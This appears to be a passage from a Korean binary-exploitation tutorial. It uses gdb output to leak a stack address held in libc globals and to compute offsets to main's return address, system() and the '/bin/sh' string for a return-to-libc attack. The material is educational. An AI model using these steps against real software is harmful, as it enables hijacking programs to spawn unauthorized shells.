Leaking Stack Address In libc.so.6 :
    libc.so.6 라이브러리의 전역 변수에는 프로그램의 argv, 즉 스택 메모리 주소가 존재합니다.

    gdb의 find 명령어를 통해 main 함수의 두 번째 인자인 argv의 주소를 libc.so.6 라이브러리에서 찾아보도록 하겠습니다.
    ex)
        $ gdb -q ./example7
        Reading symbols from ./example7...(no debugging symbols found)...done.
        (gdb) b *main+0
        Breakpoint 1 at 0x804859f
        (gdb) r
        Starting program: ~/example7 
        Breakpoint 1, 0x0804859f in main ()
        (gdb) x/4wx $esp
        0xffffd55c: 0xf7e19637  0x00000001  0xffffd5f4  0xffffd5fc
        (gdb) info proc map
        process 5039
        Mapped address spaces:
            Start Addr   End Addr       Size     Offset objfile
            0x8048000  0x8049000     0x1000        0x0 ~/example7
            0x8049000  0x804a000     0x1000        0x0 ~/example7
            0x804a000  0x804b000     0x1000     0x1000 ~/example7
            0xf7e00000 0xf7e01000     0x1000        0x0 
            0xf7e01000 0xf7fb1000   0x1b0000        0x0 /lib/i386-linux-gnu/libc-2.23.so
            0xf7fb1000 0xf7fb3000     0x2000   0x1af000 /lib/i386-linux-gnu/libc-2.23.so
            0xf7fb3000 0xf7fb4000     0x1000   0x1b1000 /lib/i386-linux-gnu/libc-2.23.so
            0xf7fb4000 0xf7fb7000     0x3000        0x0 
            0xf7fd3000 0xf7fd4000     0x1000        0x0 
            0xf7fd4000 0xf7fd7000     0x3000        0x0 [vvar]
            0xf7fd7000 0xf7fd9000     0x2000        0x0 [vdso]
            0xf7fd9000 0xf7ffc000    0x23000        0x0 /lib/i386-linux-gnu/ld-2.23.so
            0xf7ffc000 0xf7ffd000     0x1000    0x22000 /lib/i386-linux-gnu/ld-2.23.so
            0xf7ffd000 0xf7ffe000     0x1000    0x23000 /lib/i386-linux-gnu/ld-2.23.so
            0xfffdd000 0xffffe000    0x21000        0x0 [stack]
        (gdb) find /w 0xf7e01000, 0xf7fb7000, 0xffffd5f4
        0xf7fb65f0
        warning: Unable to access 2576 bytes of target memory at 0xf7fb65f1, halting search.
        1 pattern found.
        (gdb) p/x 0xf7fb65f0-0xf7e01000
        $1 = 0x1b55f0
        (gdb) 

    디버깅 화면을 보면, main 함수에 브레이크포인트를 설정한 후,
    라이브러리에서 argv 포인터를 검색해 라이브러리의 베이스 주소부터 argv 포인터 위치까지의 오프셋을 계산하였습니다.
    계산 결과 라이브러리의 베이스 주소에서부터 0x1b55f0만큼 떨어진 곳에 argv, 즉 스택 포인터가 존재한다는 것을 알 수 있습니다.

    다음으로 argv 주소부터 main 함수의 리턴 주소까지의 오프셋을 계산합니다.
    ex)
        (gdb) p/x 0xffffd5f4-0xffffd55c
        $3 = 0x98
        (gdb) 

    argv 주소부터 0x98만큼 떨어진 위치에 main 함수의 리턴 주소가 존재합니다.

    마지막으로 리턴 주소에 덮을 system 함수와 "/bin/sh" 문자열 주소의 오프셋을 구합니다.
    ex)
        (gdb) p/x 0xf7e3bda0-0xf7e01000
        $5 = 0x3ada0
        (gdb) find 0xf7e01000, 0xf7fb7000, "/bin/sh"
        0xf7f5ca0b
        warning: Unable to access 2158 bytes of target memory at 0xf7fb6793, halting search.
        1 pattern found.
        (gdb) p/x 0xf7f5ca0b-0xf7e01000
        $6 = 0x15ba0b
        (gdb) 

    system 함수와 "/bin/sh" 문자열의 주소는 각각 라이브러리 베이스 주소로부터 0x3ada0, 0x15ba0b만큼 떨어져 있다는 것을 알 수 있습니다.































